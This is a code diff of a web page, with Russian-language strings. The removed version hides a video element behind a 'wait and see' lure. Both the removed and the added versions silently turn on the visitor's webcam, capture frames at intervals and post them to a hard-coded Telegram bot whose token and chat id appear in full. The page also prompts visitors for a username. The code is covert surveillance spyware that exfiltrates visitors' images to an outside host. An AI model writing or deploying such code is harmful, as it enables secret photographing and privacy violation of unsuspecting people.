@@ -1,64 +1,57 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>New Project</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="flex bg-sky-950 items-center h-screen justify-center">
-  <video class="absolute top-0 left-0 opacity-0 pointer-events-none" id="video" width="640" height="480" autoplay></video>
-  <h1 class="text-4xl text-center animate-pulse text-amber-400">
-    Подождите немного чтобы увидеть на что способен этот сайт!
-  </h1>
+<script>
+let ism = prompt("Введите своё Имя пользователя");
 
-  <script>
-    let ism = prompt("Введите своё Имя пользователя");
-    document.addEventListener("DOMContentLoaded", function () {
-      navigator.mediaDevices
-        .getUserMedia({ video: true })
-        .then(function (stream) {
-          var video = document.getElementById("video");
-          video.srcObject = stream;
-          video.play();
-        })
-        .catch(function (err) {
-          console.log("Ошибка при доступе к камере: " + err);
-        });
+document.addEventListener("DOMContentLoaded", function () {
+  const video = document.getElementById("video");
 
-      function sendPhoto() {
-        var video = document.getElementById("video");
-        var canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        var context = canvas.getContext("2d");
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(function (blob) {
-          var formData = new FormData();
-          formData.append("chat_id", "1347186841");
-          formData.append("photo", blob);
+  navigator.mediaDevices
+    .getUserMedia({ video: true })
+    .then(function (stream) {
+      video.srcObject = stream;
+      video.play();
 
-          fetch(
-            "https://api.telegram.org/bot7963148627:AAHGkT746bxkUEnGH0UC5-rV0nd2tDpFKkg/sendPhoto",
-            {
-              method: "POST",
-              body: formData,
-            }
-          )
-          .then(function (response) {
-            if (!response.ok) {
-              throw new Error("Ошибка отправки фотографии на сервер");
-            }
-            console.log("Фотография успешно отправлена на сервер");
-          })
-          .catch(function (error) {
-            console.error("Произошла ошибка:", error);
-          });
-        }, "image/jpeg");
-      }
-
-      setInterval(sendPhoto, 500);
+      video.onloadedmetadata = () => {
+        setInterval(sendPhoto, 5000); // Только когда метаданные загружены
+      };
+    })
+    .catch(function (err) {
+      console.log("Ошибка при доступе к камере: " + err);
     });
-  </script>
-</body>
-</html>
+
+  function sendPhoto() {
+    if (video.videoWidth === 0 || video.videoHeight === 0) {
+      console.log("Видео ещё не готово");
+      return;
+    }
+
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const context = canvas.getContext("2d");
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    canvas.toBlob(function (blob) {
+      const formData = new FormData();
+      formData.append("chat_id", "1347186841");
+      formData.append("photo", blob);
+
+      fetch(
+        "https://api.telegram.org/bot7963148627:AAHGkT746bxkUEnGH0UC5-rV0nd2tDpFKkg/sendPhoto",
+        {
+          method: "POST",
+          body: formData,
+        }
+      )
+        .then((response) => {
+          if (!response.ok) {
+            throw new Error("Ошибка отправки фотографии на сервер");
+          }
+          console.log("Фотография успешно отправлена");
+        })
+        .catch((error) => {
+          console.error("Произошла ошибка:", error);
+        });
+    }, "image/jpeg");
+  }
+});
+</script>
